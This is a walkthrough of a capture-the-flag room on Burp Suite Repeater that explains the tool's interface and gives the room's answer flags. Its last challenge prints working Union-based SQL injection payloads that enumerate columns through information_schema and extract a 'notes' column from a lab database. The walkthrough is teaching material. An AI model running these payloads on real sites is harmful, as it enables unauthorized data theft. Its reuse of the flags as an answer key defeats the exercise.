# Burp Suite: Repeater

## Overview

This room explores Burp Suite Repeater, a tool used to modify and resend HTTP requests. It is useful for manually testing web applications, analyzing server responses, and identifying vulnerabilities such as SQL Injection.

## Task 1 - Introduction

Start the AttackBox and deploy the target machine.

No answer needed.

## Task 2 - What is Repeater?

Burp Suite Repeater allows us to capture, modify, and resend HTTP requests to a target.

Requests can be sent from the Proxy module to Repeater, where we can modify headers, parameters, cookies, and request methods before sending them again.

Repeater is useful for:

- Manual endpoint testing.
- Analyzing HTTP responses.
- Testing input validation.
- Identifying potential vulnerabilities.
- Manually testing SQL Injection.

### Main Interface Sections

1. Request List: Displays requests sent to Repeater.
2. Request Controls: Allows sending, cancelling, and navigating request history.
3. Request and Response View: Displays and allows modification of requests and their corresponding responses.
4. Layout Options: Changes how request and response panels are displayed.
5. Inspector: Provides an organized interface for analyzing and modifying request components.
6. Target: Displays the destination IP address or domain.

### Answer

| Question | Answer |
|---|---|
| Which section gives us more intuitive control over our requests? | Inspector |

## Task 3 - Basic Usage

The most common way to use Repeater is by capturing a request through the Proxy module.

### Steps

1. Open Burp Suite.
2. Navigate to Proxy.
3. Enable Intercept.
4. Visit the target website.
5. Capture an HTTP request.
6. Right-click the request and select Send to Repeater.
7. Alternatively, use `Ctrl + R`.
8. Open Repeater and click Send.

The request will appear in the Request view. After sending it, the server response will appear in the Response view.

You can modify the request and send it again to compare the results.

### Answer

| Question | Answer |
|---|---|
| Which view will populate when sending a request from the Proxy module to Repeater? | Request view |

## Task 4 - Message Analysis Toolbar

Repeater provides four options for analyzing HTTP messages.

### Available Views

- Pretty: Formats the response to make it easier to read.
- Raw: Displays the original response without additional formatting.
- Hex: Displays the response in hexadecimal format.
- Render: Displays the response as it would appear in a web browser.

The Render option is particularly useful when we want to visualize the actual appearance of a web page.

### Answer

| Question | Answer |
|---|---|
| Which option allows us to visualize the page as it would appear in a web browser? | Render |

## Task 5 - Inspector

Inspector provides an organized breakdown of HTTP requests and responses.

It allows us to inspect and modify different request components without manually editing the raw HTTP message.

### Main Sections

- Request Attributes: Request method, path, and protocol.
- Request Query Parameters: Parameters included in the URL.
- Request Body Parameters: Data sent in the body of a request, particularly POST requests.
- Request Cookies: Cookies included in the request.
- Request Headers: HTTP headers sent to the server.
- Response Headers: Headers returned by the server.

### Answer

| Question | Answer |
|---|---|
| Which section in Inspector is specific to POST requests? | Request Body Parameters |

## Task 6 - Practical Example

This task demonstrates how to modify an HTTP request header using Repeater.

### Steps

1. Capture a request to `http://MACHINE_IP/` using Proxy.
2. Send the request to Repeater.
3. Click Send to receive the HTML response.
4. Open Inspector.
5. Navigate to Request Headers.
6. Add a new header:

```http
FlagAuthorised: True
```

7. Send the modified request again.

The server checks the additional header and returns the flag.

### Answer

| Question | Answer |
|---|---|
| What is the flag you receive? | `THM{Yzg2MWI2ZDhlYzdlNGFiZTUzZTIzMzVi}` |

## Task 7 - Challenge

This task explores how an endpoint responds to unexpected input.

The target website contains product pages accessible through numeric endpoints:

```text
/products/1
/products/2
/products/3
```

The objective is to cause a `500 Internal Server Error` by manipulating the product ID.

### Steps

1. Navigate to `http://MACHINE_IP/products/`.
2. Click one of the See More links.
3. Capture the request using Proxy.
4. Send the request to Repeater.
5. Modify the product ID to a negative value:

```http
GET /products/-2 HTTP/1.1
```

6. Click Send.
7. Observe the server response.

The unexpected input causes the endpoint to return a `500 Internal Server Error`.

### Answer

| Question | Answer |
|---|---|
| What is the flag you receive when you cause a 500 error? | `THM{N2MzMzFhMTA1MmZiYjA2YWQ4M2ZmMzhl}` |

## Task 8 - Extra-mile Challenge

This challenge involves exploiting a Union-based SQL Injection vulnerability in the `/about/ID` endpoint.

The objective is to retrieve the CEO's notes from the database.

### 1. Capture the Request

Navigate to:

```text
http://MACHINE_IP/about/2
```

Capture the request using Proxy and send it to Repeater.

### 2. Identify the SQL Injection

Modify the endpoint by adding a single quotation mark:

```http
GET /about/2' HTTP/1.1
```

Send the request.

The server returns a `500 Internal Server Error` and exposes part of the SQL query:

```sql
SELECT firstName, lastName, pfpLink, role, bio
FROM people
WHERE id = 2'
```

This reveals useful information:

- Database table: `people`
- Number of selected columns: 5
- The endpoint is vulnerable to SQL Injection.

### 3. Enumerate the Columns

Use the following payload:

```sql
0 UNION ALL SELECT column_name,null,null,null,null
FROM information_schema.columns
WHERE table_name="people"
```

The response reveals the table columns.

To retrieve all column names at once, use:

```sql
0 UNION ALL SELECT group_concat(column_name),null,null,null,null
FROM information_schema.columns
WHERE table_name="people"
```

The columns include:

```text
id
firstName
lastName
pfpLink
role
shortRole
bio
notes
```

The target column is `notes`.

### 4. Retrieve the CEO's Notes

The CEO's user ID is `1`.

Use the following payload:

```sql
0 UNION ALL SELECT notes,null,null,null,null
FROM people
WHERE id = 1
```

Send the request in Repeater.

The response contains the CEO's notes, including the flag.

### Answer

| Question | Answer |
|---|---|
| Exploit the UNION SQL Injection vulnerability. What is the flag? | `THM{ZGE3OTUyZGMyMzkwNjJmZjg3Mzk1NjJh}` |

## Task 9 - Conclusion

This room introduced the Burp Suite Repeater module and demonstrated how it can be used to manipulate and resend HTTP requests.

### Key Takeaways

- Capture requests using Proxy.
- Send requests to Repeater using `Ctrl + R`.
- Modify HTTP headers, parameters, and cookies.
- Analyze responses using Pretty, Raw, Hex, and Render.
- Use Inspector to modify request components.
- Identify unexpected server behavior.
- Perform manual Union-based SQL Injection testing in an authorized lab.

Burp Suite Repeater is an essential tool for manual web application security testing.
